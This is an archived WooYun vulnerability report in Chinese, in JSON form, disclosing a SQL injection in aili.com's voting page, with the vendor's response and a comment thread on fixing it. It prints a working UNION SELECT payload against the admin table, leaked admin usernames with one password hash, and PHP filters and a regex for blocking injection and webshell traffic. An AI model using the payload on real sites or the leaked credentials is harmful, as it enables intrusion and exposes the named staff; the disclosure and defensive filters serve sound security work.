{"id": 64494, "wybug_id": "wooyun-2013-025661", "wybug_title": "爱丽网注入一个，可脱裤子。。。", "wybug_corp": "aili.com", "wybug_author": "逆雪寒", "wybug_date": "2013-06-11 19:23", "wybug_open_date": "2013-06-16 19:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 存在一个注入点~~ 可脱 newcms 裤子。。。 详细说明：  正在逛着  突然看到 http://plus.aili.com/vote/vote_end.php?vid=31  这个投票~~。 习惯就加 单'   哦也~~ 出错了   System Maintenance......Please wait Try.Invalid SQL: select * from new_vote_main where id = 31\\': mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_problem where vid = 31\\': mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon line虽然  对 '转意了。。。但还是木有用  数字类型 转意~~ 木啥用呀手爆开始http://plus.aili.com/vote/vote_end.php?vid=31%20UNION%20ALL%20SELECT%20username,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20from%20admin%20--在爆出来的某个账号上。我尝试进行彩虹表发现个问题：账号：leejin密码：650ff33b2875af2f34a2b576dee83947这样的密码，，看起来复杂其实组合简单，还是很容易给破解的。 建议 数字+英文+古怪字符(or 大写字母)   万无一失   漏洞证明：  System Maintenance......Please wait Try.Invalid SQL: select * from new_vote_main where id = 31 UNION ALL SELECT username,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from admin --: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 48: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = : mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = admin: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = Aidewei: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = chenming: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = dingge: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = jackzxrl: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = leejin: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = seo: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = test: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = test-李杰鹏: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = wangfeng: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = wang晨: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = yongbao: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = yongbaolin: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = zhangwen: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = zhaoyang: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = zxmr: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 爱德威: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 白晓萌: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 边鑫: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 蔡嘉铭: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 蔡利: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 蔡寅寅: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 曹灿: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 曹翠翠: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 曹崴: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 测试用户: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......Please wait Try.Invalid SQL: select * from new_vote_option where pid = 岑月: mysql_fetch_array(): supplied argument is not a valid MySQL result resource inon lineSystem Maintenance......   修复方案：  看了下爱丽网 这个厂商。。。漏洞不断~~ 注入不断。。 感觉开发和运维~是木有啥好办法了。只能来一堵一个(啥时候是个头)。 那我来给你们个方案吧。。。。  既然是PHP。。没有混在其他语言。那还是好办的。1、防SQL注入 百度一下 360.cn 写过一个防SQL注入的PHP脚本。 用过来 GPC 进行检测。部分代码：$getfilter=\"'|(and|or)\\\\b.+?(>|<|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";$postfilter=\"\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";$cookiefilter=\"\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";foreach ($_GET as $key=>$value) {         StopAttack($key, $value, $getfilter);}foreach ($_POST as $key=>$value) {         StopAttack($key, $value, $postfilter);}foreach ($_COOKIE as $key=>$value) {        StopAttack($key, $value, $cookiefilter);}下载这个脚本。把这个脚本放到 web目录外。 然后  修改PHP.ini :auto_prepend_file = 360_safe3.php注：但可能会和你之前的代码 过滤和转意部分代码有冲突，自己看情况修改。  这样做以后。服务器所有存在的PHP文件，都自动得到保护了。。不用在一个一个~堵了。叽里旮旯儿的代码都护住了。。运维开发可以安心睡觉了。这样做唯一的问题就是 服务器负载会多 %30 - %60。 但对于用户数据和安全来说。。你们是值得的。2、让已经存在的 \"一句话木马”失效  服务器上应该存在不少 一句话木马了。。我见到白帽子们已经都上传WEBSHELL 上去了。。菜刀也上了。   菜刀是通过 php 的 base64编码进行 POST 请求来执行PHP脚本(我自己抓包看过)，所以呢 就算你按照我的第一部 加了360安全脚本是防不住已经存在的 WEBSHELL。 我们要想办法让存在的WEBSHELL失效。判断POST或者GET里有存在base64_decode 解密函数的存在，那%99就是菜刀在请求。 那么这样来做，在我说的第一部的360 安全脚本的 StopAttack哪里 修改下代码。加多一句：  preg_match(\"/base64_decode/is\",$StrFiltValue) && exit('_stop attack');部分代码：function StopAttack($StrFiltKey, $StrFiltValue, $ArrFiltReq) {        global $attack_360_log;        if (is_array($StrFiltValue)) {            $StrFiltValue = implode($StrFiltValue);        }         preg_match(\"/base64_decode/is\",$StrFiltValue) && exit('_stop attack');        if (preg_match(\"/\".$ArrFiltReq.\"/is\",$StrFiltValue)==1) {测试结果：\n\n。。。不希望再看到爱丽网被注入。。。。。。   版权声明：转载请注明来源 逆雪寒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-06-16 19:24 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-12 01:42 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  天热 该脱了    \n     2013-06-15 09:03 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网，。。。。这次响应怎么那么慢。。。。还没上班吗    \n     2013-06-15 09:54 |    \t\tITLynn \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        | 还有几天就去从军了，野战兵!)\t\t \n  @逆雪寒 ~~俺也找到一处注入也是昨天才响应，估计端午放假    \n     2013-06-16 20:14 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网 ...这个注入 你也忽略。。。我已经无语了~~  更别说我后面写的 那些解决方案。。。。活该被人脱你库。。。。   测试了下。。忽略而且漏洞还没修补。。。    \n     2013-06-16 21:47 |    \t\t爱丽网(乌云厂商)\t\t \n  晕死！这被自动忽略了！很严重啊！    \n     2013-06-16 21:48 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网  说好的我的礼物那。。。~~~~ 啧啧啧    \n     2013-06-16 21:50 |    \t\t爱丽网(乌云厂商)\t\t \n  端午    \n     2013-06-16 21:52 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网  坐等厂家的礼物咯~~~  啧啧啧    \n     2013-06-16 22:07 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo 咋没见到你的漏洞呢？ 找了一圈！    \n     2013-06-16 22:08 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 非故意， 礼物找给！ 微博我关注你了！ 我下边人再出这种笨蛋问题。 直接私信我！     \n     2013-06-16 22:14 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网     让哒猫伤心了   WooYun: 你登录、或不登录 ，注入点都在那里(可获取爱丽网管理密码)    \n     2013-06-16 22:18 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网  乌云Rank 还有救吗。。。 我的那个解决方案。。我线上也在用。希望能帮到爱丽。。。    \n     2013-06-16 22:22 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo 呵呵， 看到了，看到了！ 礼物很快就会送到！     \n     2013-06-16 22:23 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  我了过去。。公开了 还不赶紧修。。。等被爆菊花啊？    \n     2013-06-16 22:23 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网   给厂商赞个    \n     2013-06-16 22:26 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @逆雪寒 360那个可以防 但是不推荐，啥都按这个搞一下浪费资源。建议使用 80sec 提供的那个方法。只对query 的sql进行安全检查！    \n     2013-06-16 22:27 |    \t\t爱丽网(乌云厂商)\t\t \n  @齐迹 运维都叫起来了， 修呢！    \n     2013-06-16 22:30 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @齐迹 是耗费一点资源 但却是换来安全。。 应用多。。叽里旮旯儿的哪里都有。。 你怎么确保每个query 都检查？ 有没漏掉？ 不是一个系统 单入口 那你这个方案是可行的。。。。  按照爱丽网这样的情况。 最好走我这个方案。。。     \n     2013-06-16 22:32 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网 运维懂PHP开发吗。。。懂就 先  intval($id) 固定数字类型。。先解决这个注入    \n     2013-06-16 22:33 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @爱丽网 @逆雪寒 刚才去逛了一下 到处放 单引号，到处sql出来。。。当务之急。性能都是弱爆的事情。程序员拖出来一个个打屁屁！    \n     2013-06-16 22:34 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  哦哦  504了。。。    \n     2013-06-16 22:36 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 人都来了！     \n     2013-06-16 22:38 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网 先 intval($_GET['vid']) 堵住这个漏洞先。然后 按照我那个方案，所有跑php 的服务器都走那个方案  堵住注入测试先。。那今晚就可以好好睡觉了.... 明天再弄堵住已经存在的WEBSHELL。。。。    \n     2013-06-16 22:39 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 我们的入口多！ 业务多！ 站点多！ 比较乱！ 你的方案可行！ 开发人员在开发过程中存在的问题比较多！我这里的运维有懂开发的， 开发的人也都再！    \n     2013-06-16 22:40 |    \t\t爱丽网(乌云厂商)\t\t \n  这个漏洞的忽略， 是耻辱！ 是我的疏忽！    \n     2013-06-16 22:42 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网 加油。。实行这个方案。。以后爱丽网SQL注入。那是肯定~~很难了    \n     2013-06-16 22:45 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 呵呵， 我没这么乐观啦！ intval($_GET['vid']) 这个堵了！    \n     2013-06-16 22:57 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网     既然人都叫起来了  就瞅这个机会小弟就再给你一个点吧一块修补好了  就不要Rank 了  私信      坐等之前的礼物       \n     2013-06-16 22:59 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @Damo  @爱丽网  。。。。不要rank。。。。 给我吧  我十分需要 哈哈    \n     2013-06-16 23:01 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 @Damo  呵呵， rank 有要的。呵呵！  你转给他发！ rank我不吝啬！    \n     2013-06-16 23:01 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo 微博我了？  哪？    \n     2013-06-16 23:02 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网 @逆雪寒 可获取管理员  同时还有妹子  反正和  WooYun: 你登录、或不登录 ，注入点都在那里(可获取爱丽网管理密码)   是一个库的 但是注入点不同   上次给了8  Rank  这次再白送一个点  能不能给个大礼包 或者妹子之类的（非充气）    \n     2013-06-16 23:05 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @Damo 我去~~ 你难道做白帽子就为了礼物吗......咋一直追着要礼物。。。。    \n     2013-06-16 23:05 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo 额～～～  妹子～～～～～  色鬼～～～～    \n     2013-06-16 23:14 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 兄弟，当前漏洞修上了， 帮忙验证一下！ 修的是否有效？     \n     2013-06-16 23:14 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 你提的解决方案，正在逐台服务器检查部署中！    \n     2013-06-16 23:19 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @逆雪寒 @爱丽网    额~~~~  妹子也行  礼物都不算事  啧啧啧啧    \n     2013-06-16 23:28 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  @xsser      建议乌云把时间调长要不对厂商帽子都是伤害。那么急着公布干嘛    \n     2013-06-16 23:38 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网    还是选择了 360   修复速度挺快~~~~  啧啧啧啧    \n     2013-06-16 23:41 |    \t\t爱丽网(乌云厂商)\t\t \n  @p0di 我赞同哦！    \n     2013-06-16 23:42 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo @逆雪寒 @Damo 还能脱不？ 帮确认下！    \n     2013-06-16 23:44 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网  刚确认了下   OK了     LOL 睡吧~~~    \n     2013-06-16 23:48 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  @爱丽网   所有厂商能像你们这么虚心接受同帽子交流就好了。    \n     2013-06-16 23:54 |    \t\t爱丽网(乌云厂商)\t\t \n  @p0di 唉， 这不是也工作没做到位！ 漏了这么大个漏！ 希望亡羊补牢为时未晚！    \n     2013-06-16 23:54 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo ok, 感谢！  还有你发的那个漏洞！    \n     2013-06-17 00:06 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网    两个都测了  都OK了   好勤劳的厂商~~~赞个    \n     2013-06-17 00:11 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo 再感谢一下！呵呵， 还有木有库存漏洞？ 都发上来吧！ 呵呵！    \n     2013-06-17 00:15 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网  现在真心没了 有了就会直接发 出来的，以后会有的  啧啧啧啧啧  都这点了 让你那些运维的兄弟歇歇吧    \n     2013-06-17 00:50 |    \t\t爱丽网(乌云厂商)\t\t \n  @Damo 他们目前不敢休息！ 大扫除呢！ 上边雪兄说，有菜刀在上边！ 这个得查！    \n     2013-06-17 01:59 |    \t\tITLynn \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        | 还有几天就去从军了，野战兵!)\t\t \n  @爱丽网 厂商真勤劳！    \n     2013-06-17 08:38 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网  嗯堵住了。 菜刀不好防。。如果 木马放在非上传目录。。 先按照我说的方法防止菜刀连接木马先。。然后排查所有777权限的目录或者是PHP进程有写权限的目录等里面的代码文件。。不过很是麻烦。 1、 mtime 是可以修改的，一般传了木马都修改。。 2、一句话木马一般都是传免杀的上去，无法根据 eval等关键字来查找...更狠的直接在你代码逻辑里插入。。。所以为了万无一失~~ 只能是让菜刀无法连接上木马，无法使用。。木马存在服务器也无所谓了    \n     2013-06-17 09:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @爱丽网 礼物照给啊，给力    \n     2013-06-17 09:49 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @爱丽网  安全第一~~~    \n     2013-06-17 15:33 |    \t\t爱丽网(乌云厂商)\t\t \n  @逆雪寒 对木马连接也做了处理了， 兄弟帮忙检测一下！    \n     2013-06-17 17:25 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网  是 preg_match(\"/base64_decode/is\",$StrFiltValue) && exit('_stop attack'); 吗？如果是按照我那样做的。 放心吧  菜刀用不了。     \n     2013-12-17 19:09 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @爱丽网  好厂商啊。我有两枚储存型的xss，可是不知道为啥不给过，能私信下看看然后送个礼物吗,可以的话私信俺=。=    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}